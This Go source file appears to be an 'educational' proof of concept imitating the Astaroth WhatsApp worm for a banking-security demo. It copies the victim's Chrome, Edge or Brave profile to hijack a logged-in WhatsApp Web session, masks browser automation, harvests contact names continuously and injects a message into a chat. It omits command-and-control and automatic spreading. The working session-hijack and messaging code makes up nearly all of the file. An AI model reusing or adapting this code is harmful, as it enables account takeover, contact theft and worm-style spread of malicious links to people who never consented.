package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
)

/*
WhatsApp Automation POC - Versão Educacional (Go) - FEBRABAN Demo
-----------------------------------------------------------------
Demonstra as capacidades wormable do Astaroth:
1. AUTO-DETECÇÃO do perfil do Chrome (Session Hijacking)
2. CÓPIA do perfil para pasta temporária (evita conflito de lock)
3. COLETA EM TEMPO REAL de contatos via Goroutines
4. POPUP VISUAL (Windows MessageBox) para impacto na plateia

RESTRIÇÕES DE SEGURANÇA:
- Sem C2 ou conexões externas.
- Sem propagação automática.
*/

const (
	WhatsAppURL = "https://web.whatsapp.com"
	TestMessage = "POC: Demonstração de automação em Go para aula de Cibersegurança."
)

// --- Windows API para MessageBox ---
var (
	user32         = syscall.NewLazyDLL("user32.dll")
	procMessageBox = user32.NewProc("MessageBoxW")
)

const (
	MB_OK              = 0x00000000
	MB_ICONWARNING     = 0x00000030
	MB_ICONINFORMATION = 0x00000040
	MB_TOPMOST         = 0x00040000
)

func messageBox(title, text string, flags uintptr) {
	titlePtr, _ := syscall.UTF16PtrFromString(title)
	textPtr, _ := syscall.UTF16PtrFromString(text)
	procMessageBox.Call(
		0,
		uintptr(unsafe.Pointer(textPtr)),
		uintptr(unsafe.Pointer(titlePtr)),
		flags,
	)
}

// --- Auto-detecção do Perfil do Chrome ---
func findChromeProfile() string {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return ""
	}

	candidates := []string{
		filepath.Join(localAppData, "Google", "Chrome", "User Data"),
		filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
		filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
	}

	for _, path := range candidates {
		if info, err := os.Stat(path); err == nil && info.IsDir() {
			fmt.Printf("[+] Perfil encontrado: %s\n", path)
			return path
		}
	}
	return ""
}

// --- Cópia do Perfil (técnica usada pelo Astaroth real) ---
// O malware copia o perfil para evitar o erro "Profile in Use" quando o Chrome está aberto.
// Copiamos apenas os arquivos essenciais para manter a sessão do WhatsApp.
func copyProfile(srcDir string) (string, error) {
	tempDir, err := os.MkdirTemp("", "astaroth-poc-*")
	if err != nil {
		return "", fmt.Errorf("falha ao criar diretório temporário: %w", err)
	}

	fmt.Printf("[*] Copiando perfil para: %s\n", tempDir)

	// Arquivos e pastas críticos para manter a sessão do WhatsApp Web
	// O malware real copia tudo; aqui copiamos apenas o essencial
	essentialItems := []string{
		"Default",
		"Local State",
		"Profile 1",
	}

	for _, item := range essentialItems {
		src := filepath.Join(srcDir, item)
		dst := filepath.Join(tempDir, item)

		info, err := os.Stat(src)
		if err != nil {
			continue // Item não existe, pula
		}

		if info.IsDir() {
			fmt.Printf("    [~] Copiando diretório: %s...\n", item)
			if err := copyDir(src, dst); err != nil {
				fmt.Printf("    [!] Aviso ao copiar %s: %v (continuando...)\n", item, err)
			}
		} else {
			if err := copyFile(src, dst); err != nil {
				fmt.Printf("    [!] Aviso ao copiar %s: %v\n", item, err)
			}
		}
	}

	fmt.Println("[+] Perfil copiado com sucesso!")
	return tempDir, nil
}

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Pula arquivos com erro (locked files)
		}

		relPath, _ := filepath.Rel(src, path)
		dstPath := filepath.Join(dst, relPath)

		if info.IsDir() {
			return os.MkdirAll(dstPath, 0755)
		}

		// Pula arquivos grandes (cache, logs) para velocidade
		if info.Size() > 50*1024*1024 { // > 50MB
			return nil
		}

		// Pula pastas de cache para velocidade
		if strings.Contains(relPath, "Cache") || strings.Contains(relPath, "Service Worker") {
			return nil
		}

		return copyFile(path, dstPath)
	})
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return nil // Arquivo locked, pula silenciosamente
	}
	defer in.Close()

	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
		return err
	}

	out, err := os.Create(dst)
	if err != nil {
		return nil
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

func main() {
	fmt.Println("╔══════════════════════════════════════════════════════╗")
	fmt.Println("║   Astaroth WhatsApp Worm - POC Educacional (Go)    ║")
	fmt.Println("║   FEBRABAN - Análise de Ameaças Cibernéticas       ║")
	fmt.Println("╚══════════════════════════════════════════════════════╝")
	fmt.Println()

	// ETAPA 1: Auto-detecção e cópia do perfil
	fmt.Println("[1/4] Buscando perfil do navegador no sistema...")
	profilePath := findChromeProfile()

	l := launcher.New().
		Headless(false).
		Leakless(false).
		Set("disable-blink-features", "AutomationControlled")

	var tempProfileDir string

	if profilePath != "" {
		fmt.Println("[+] SESSION HIJACK: Copiando perfil para evitar conflito de lock...")
		var err error
		tempProfileDir, err = copyProfile(profilePath)
		if err != nil {
			fmt.Printf("[!] Erro ao copiar perfil: %v\n", err)
			fmt.Println("[!] Continuando sem sessão logada...")
		} else {
			l.UserDataDir(tempProfileDir)
			fmt.Println("[+] Perfil clonado! O Chrome pode continuar aberto normalmente.")
		}
	} else {
		fmt.Println("[!] Nenhum perfil encontrado. Será necessário escanear o QR Code.")
	}

	// Cleanup do perfil temporário ao sair
	if tempProfileDir != "" {
		defer func() {
			fmt.Println("[*] Limpando perfil temporário...")
			os.RemoveAll(tempProfileDir)
		}()
	}

	url := l.MustLaunch()
	browser := rod.New().ControlURL(url).MustConnect()
	defer browser.MustClose()

	// ETAPA 2: Abrir WhatsApp Web
	fmt.Println("[2/4] Abrindo WhatsApp Web...")
	page := browser.MustPage(WhatsAppURL)

	if profilePath == "" {
		fmt.Println("[!] Escaneie o QR Code no navegador...")
	} else {
		fmt.Println("[*] Aguardando carregamento da sessão sequestrada...")
	}

	page.MustElement("[data-testid='chat-list']").MustWaitVisible()
	fmt.Println("[+] WhatsApp Web carregado com sucesso!")
	time.Sleep(2 * time.Second)

	// ETAPA 3: Coleta de contatos em tempo real
	fmt.Println("[3/4] Iniciando coleta de contatos em tempo real...")

	var mu sync.Mutex
	collectedContacts := []string{}

	// Coleta inicial
	initialElements := page.MustElements("span[title]")
	for _, el := range initialElements {
		name := el.MustText()
		if name != "" && len(name) > 1 {
			mu.Lock()
			collectedContacts = append(collectedContacts, name)
			mu.Unlock()
		}
		if len(collectedContacts) >= 10 {
			break
		}
	}

	// Mostra popup com os contatos coletados
	if len(collectedContacts) > 0 {
		popupText := fmt.Sprintf(
			"SESSÃO WHATSAPP COMPROMETIDA!\n\n"+
				"O malware conseguiu acessar sua conta\n"+
				"SEM SENHA e SEM QR CODE.\n\n"+
				"Contatos coletados em tempo real:\n"+
				"------------------------------\n"+
				"%s\n"+
				"------------------------------\n\n"+
				"Total: %d contatos expostos.\n\n"+
				"Em um ataque real, TODOS os contatos\n"+
				"receberiam links maliciosos agora.",
			formatContacts(collectedContacts),
			len(collectedContacts),
		)

		go messageBox(
			"Astaroth POC - Sessão Sequestrada",
			popupText,
			MB_ICONWARNING|MB_TOPMOST,
		)

		fmt.Println("\n[!!] POPUP EXIBIDO PARA A PLATEIA!")
		fmt.Println("[*] Contatos coletados:")
		for i, name := range collectedContacts {
			fmt.Printf("    %d. %s\n", i+1, name)
		}
	}

	// Goroutine de monitoramento contínuo
	go func() {
		seen := make(map[string]bool)
		for _, n := range collectedContacts {
			seen[n] = true
		}

		for {
			time.Sleep(3 * time.Second)
			elements := page.MustElements("span[title]")
			for _, el := range elements {
				name, err := el.Text()
				if err != nil || name == "" || len(name) <= 1 {
					continue
				}
				if !seen[name] {
					seen[name] = true
					mu.Lock()
					collectedContacts = append(collectedContacts, name)
					total := len(collectedContacts)
					mu.Unlock()
					fmt.Printf("\a[REAL-TIME] Novo contato detectado: %s (Total: %d)\n", name, total)
				}
			}
		}
	}()

	// ETAPA 4: Demonstração de injeção
	fmt.Println("\n[4/4] Selecione um chat no navegador e pressione ENTER para demonstrar a injeção...")
	fmt.Println("      (O monitoramento continua em segundo plano...)")

	var inputStr string
	fmt.Scanln(&inputStr)

	chatBox := page.MustElement("div[contenteditable='true'][data-tab='10']")
	chatBox.MustClick().MustInput(TestMessage)
	chatBox.MustType(input.Enter)

	// Popup final
	mu.Lock()
	totalContacts := len(collectedContacts)
	mu.Unlock()

	go messageBox(
		"Astaroth POC - Injeção Concluída",
		fmt.Sprintf(
			"Mensagem enviada com sucesso!\n\n"+
				"Conteúdo: \"%s\"\n\n"+
				"Em um cenário real, essa mensagem\n"+
				"conteria um link para o próximo\n"+
				"estágio do malware (downloader).\n\n"+
				"Total de contatos coletados: %d",
			TestMessage,
			totalContacts,
		),
		MB_ICONINFORMATION|MB_TOPMOST,
	)

	fmt.Printf("[+] Mensagem injetada: %s\n", TestMessage)
	fmt.Println("[*] POC concluída. Pressione ENTER para fechar.")
	fmt.Scanln(&inputStr)
}

func formatContacts(contacts []string) string {
	var lines []string
	for i, name := range contacts {
		lines = append(lines, fmt.Sprintf("  %d. %s", i+1, name))
	}
	return strings.Join(lines, "\n")
}
